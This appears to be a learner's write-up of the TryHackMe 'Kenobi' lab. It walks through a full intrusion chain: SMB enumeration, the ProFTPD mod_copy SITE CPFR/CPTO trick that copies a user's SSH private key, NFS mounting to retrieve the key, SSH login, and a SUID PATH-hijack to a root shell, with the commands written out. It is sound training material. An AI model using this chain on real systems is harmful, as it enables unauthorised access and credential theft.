# THM Kenobi — Attack Chain & Lessons

This lab focuses on **external enumeration → foothold → privilege escalation**.
Unlike local PrivEsc labs, the attacker starts **outside the target** and must chain multiple services to gain access.

---

## 🔥 Attack Flow Overview

```text
External Enumeration
→ Service Discovery
→ Information Leak (SMB)
→ Exploit (FTP - ProFTPD)
→ File Access (NFS)
→ Foothold (SSH)
→ PrivEsc (PATH Hijack)
```

---

## ⚔️ Phase 1 — External Enumeration

### 🔍 Port & Service Discovery

```bash
nmap -sV -sC <target>
```

### 🧠 Key Findings

| Port    | Service | Meaning                                           |
| ------- | ------- | ------------------------------------------------- |
| 21      | FTP     | File transfer (potential access / version leak)   |
| 139/445 | SMB     | File sharing → often leaks sensitive info         |
| 111     | rpcbind | Helps identify NFS services                       |
| 2049    | NFS     | Network file system (mountable access)            |
| 22      | SSH     | Remote login (use after credentials/key obtained) |

---

## ⚔️ Phase 2 — SMB Enumeration (Information Leak)

### 🔍 Action

```bash
smbclient -L //<target>/
```

### 🧠 Findings

* Anonymous share available
* Extracted file revealed:

  * FTP running (ProFTPD)
  * User: `kenobi`
  * SSH key path: `/home/kenobi/.ssh/id_rsa`

### 🎯 Insight

```text
SMB = Intel source, not execution
```

This phase gives:

* usernames
* file paths
* service hints

---

## ⚔️ Phase 3 — FTP Exploitation (ProFTPD)

### 🔍 Version Discovery

* Identified: **ProFTPD 1.3.5**

### 🔎 Exploit Research

```bash
searchsploit proftpd 1.3.5
```

### ⚔️ Vulnerability

* `mod_copy` module
* Allows file copy without authentication

### 💥 Exploit Mechanism

```text
SITE CPFR <source>
SITE CPTO <destination>
```

### 🎯 Use

Copy sensitive file:

```text
/home/kenobi/.ssh/id_rsa → /var/tmp/id_rsa
```

---

## ⚔️ Phase 4 — NFS Abuse (Filesystem Access)

### 🔍 Enumeration

```bash
showmount -e <target>
```

### 🧠 Finding

* `/var` is exported

### ⚔️ Action

```bash
mount <target>:/var /mnt
```

### 🎯 Insight

```text
NFS = file access bridge
```

Now attacker can access:

```text
/var/tmp/id_rsa
```

---

## ⚔️ Phase 5 — Foothold via SSH

### 🔍 Steps

```bash
chmod 600 id_rsa
ssh -i id_rsa kenobi@<target>
```

### 🎯 Result

Shell as user `kenobi`

---

## ⚔️ Phase 6 — Privilege Escalation (PATH Hijack)

### 🔍 Enumeration

```bash
find / -perm -4000 -type f 2>/dev/null
```

### 🧠 Discovery

* SUID binary runs as root
* Uses commands:

  * `curl`
  * `uname`
  * `ifconfig`

### ⚠️ Critical Flaw

```text
Commands used WITHOUT absolute path
```

---

### ⚔️ Exploit Model

```text
CONTROL = PATH directory
POWER = root (SUID)
EXECUTION = command call
```

---

### 💥 Exploit Steps

```bash
echo '/bin/sh' > /tmp/curl
chmod +x /tmp/curl
export PATH=/tmp:$PATH
```

Run vulnerable binary → root shell

---

### 🎯 Takeaway

```text
Non-absolute command + PATH control = root execution
```

---

## 🧠 Networking Concepts Clarified

| Concept   | Meaning                                  |
| --------- | ---------------------------------------- |
| Port      | Entry point (door number)                |
| Transport | How data moves (TCP / UDP)               |
| Protocol  | Communication rules (FTP, SMB, NFS, SSH) |
| Software  | Implementation (ProFTPD, Samba)          |

### Example

```text
21/tcp open ftp
```

* Port = 21
* Transport = TCP
* Protocol = FTP
* Software = ProFTPD

---

## 🔥 Key Attacker Lessons

* Do NOT attack everything blindly
* Start with **enumeration-friendly services**
* One service can leak info for another exploit
* Chain services together (SMB → FTP → NFS → SSH)
* Data exposure is as powerful as code execution
* Always choose:

  * exact exploit match
  * low requirements
  * fastest path to goal

---

## ❌ Weaknesses Identified

* Slow mapping: service → correct tool
* Weak flag/command recall under pressure
* Slow filtering of noisy outputs (`strings`, `strace`, nmap)
* Jumping to conclusions too early
* Networking terminology not fully stable

---

## ✅ Improvement Focus

* Faster service → tool mapping (automatic thinking)
* Improve output filtering speed
* Strengthen terminology precision
* Delay commitment until sufficient evidence

---

## 🔥 Final Mental Model

```text
External Attack =

ENUMERATION
→ INFORMATION LEAK
→ SERVICE EXPLOIT
→ ACCESS
→ PRIVILEGE ESCALATION
```

```text
Winning = fastest reliable chain, not most creative path
```
